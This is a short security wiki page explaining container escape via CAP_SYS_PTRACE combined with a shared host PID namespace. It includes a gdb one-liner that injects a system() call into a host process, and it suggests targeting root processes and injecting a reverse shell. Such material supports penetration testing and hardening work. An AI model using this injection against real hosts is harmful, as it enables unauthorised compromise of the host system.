---
title: "CAP_SYS_PTRACE: container escape by injecting into host processes"
description: "Escaping a container that holds CAP_SYS_PTRACE together with a shared host PID namespace by attaching to a host process and injecting shellcode, running code in a host process outside the container."
keywords:
  - CAP_SYS_PTRACE
  - process injection
  - hostPID
  - container escape
  - ptrace
---

# CAP_SYS_PTRACE

`CAP_SYS_PTRACE` allows `ptrace` on processes the container can see. On its own, inside its own PID namespace, the container only sees its own processes. Combined with the host PID namespace (`--pid=host`), it can attach to any host process and inject code, which runs on the host.

```bash
# With hostPID and CAP_SYS_PTRACE, host processes are visible and attachable
ps -ef | grep -v grep | head                # host processes
# Attach and inject into a chosen host PID (e.g. with a ptrace injector)
gdb -p <host_pid> -batch -ex 'call (int)system("id > /tmp/pwn")' 2>/dev/null
```

## Exploitation notes

- The escape needs both the capability and visibility of host processes, so it pairs with [Host PID namespace](../../shared-host-namespaces/host-pid-namespace.md).
- Target a long-lived host process running as root; injecting a reverse shell or writing a file is enough to pivot.
- Without hostPID, ptrace is limited to the container's own processes and does not escape.

## References

- [man 2 ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html)
- [man 7 capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)
